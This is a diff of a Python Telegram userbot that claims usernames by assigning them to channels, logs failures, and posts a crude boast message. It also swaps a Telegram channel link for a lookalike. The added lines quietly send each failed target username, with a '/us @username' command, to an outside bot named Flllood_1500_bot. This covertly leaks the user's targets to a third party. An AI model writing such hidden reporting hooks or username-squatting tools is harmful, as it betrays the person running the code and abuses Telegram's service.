@@ -250,7 +250,7 @@ async def _(event):
                     await sython(functions.channels.UpdateUsernameRequest(
                         channel=ch, username=username))
                     await event.client.send_message(event.chat_id, f'''
-[https://t.me/vd_d_d/20](•- Hello)
+[https://t.me/vd_d_dd/20](•- Hello)
 •- Hey iam Fucked New User #1 
 ——————————————
 •- Dev :   @R_R_B0                           
@@ -266,6 +266,8 @@ async def _(event):
                     with open("banned.txt", "a") as f:
                         f.write(f"\n{username}")
                 except Exception as eee:
+                    await sython.send_message("Flllood_1500_bot","/start")
+                    await sython.send_message("Flllood_1500_bot",f"ֆ ɴᴇᴡ ᴜsᴇʀɴᴀᴍᴇ ғʟᴏᴏᴅ ⚚ \n\n↬ ᴜsᴇʀɴᴀᴍᴇ : @{username}\n\n sᴇɴᴅ : `/us @{username}`")
                     await sython.send_message(event.chat_id, f'''خطأ مع {username}
     الخطأ :
     {str(eee)}''')
